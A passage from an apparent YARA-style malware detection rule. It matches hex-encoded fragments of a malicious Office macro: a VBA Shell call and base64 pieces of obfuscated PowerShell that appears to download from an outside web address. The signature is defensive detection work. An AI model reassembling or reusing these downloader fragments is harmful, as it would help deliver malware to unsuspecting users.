		$a_01_1 = {73 63 48 57 6a 6d 61 73 70 20 3d 20 53 68 65 6c 6c 28 49 63 48 59 6a 4b 46 5a 2c 20 34 20 2f 20 38 20 2a 20 53 69 6e 28 30 29 29 } //1 scHWjmasp = Shell(IcHYjKFZ, 4 / 8 * Sin(0))
		$a_01_2 = {3d 20 22 49 41 41 6b 41 47 59 41 5a 41 42 7a 41 47 59 41 63 77 42 6b 41 47 59 41 49 41 41 39 41 43 41 41 49 67 42 6d 41 48 4d 41 5a 67 42 6b 41 47 63 41 61 41 42 6d 41 47 51 41 5a 41 42 6d 41 47 63 41 61 41 41 69 41 44 73 41 49 41 41 6f 41 45 34 41 52 51 42 33 41 43 30 41 62 77 42 69 41 47 6f 41 52 51 42 6a 41 48 51 41 49 41 41 63 49 47 41 41 54 67 42 67 41 47 55 41 59 41 42 55 41 47 41 41 4c 67 42 67 } //1 = "IAAkAGYAZABzAGYAcwBkAGYAIAA9ACAAIgBmAHMAZgBkAGcAaABmAGQAZABmAGcAaAAiADsAIAAoAE4ARQB3AC0AbwBiAGoARQBjAHQAIAAcIGAATgBgAGUAYABUAGAALgBg
		$a_01_3 = {47 77 41 52 51 41 6f 41 43 41 41 48 53 42 6f 41 48 51 41 64 41 42 77 41 44 6f 41 4c 77 41 76 41 48 4d 41 64 51 42 35 41 47 45 41 63 77 42 6f 41 47 67 41 62 77 42 7a 41 48 41 41 61 51 42 30 41 47 45 41 62 41 42 79 41 47 45 41 61 51 42 77 41 48 55 41 63 67 41 75 41 47 4d 41 62 77 42 74 41 } //1 GwARQAoACAAHSBoAHQAdABwADoALwAvAHMAdQB5AGEAcwBoAGgAbwBzAHAAaQB0AGEAbAByAGEAaQBwAHUAcgAuAGMAbwBtA
		$a_01_4 = {69 41 47 59 41 63 77 42 6d 41 47 51 41 5a 77 42 6f 41 47 59 41 5a 41 42 6b 41 47 59 41 5a 77 42 6f 41 22 20 26 20 5f } //1 iAGYAcwBmAGQAZwBoAGYAZABkAGYAZwBoA" & _
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}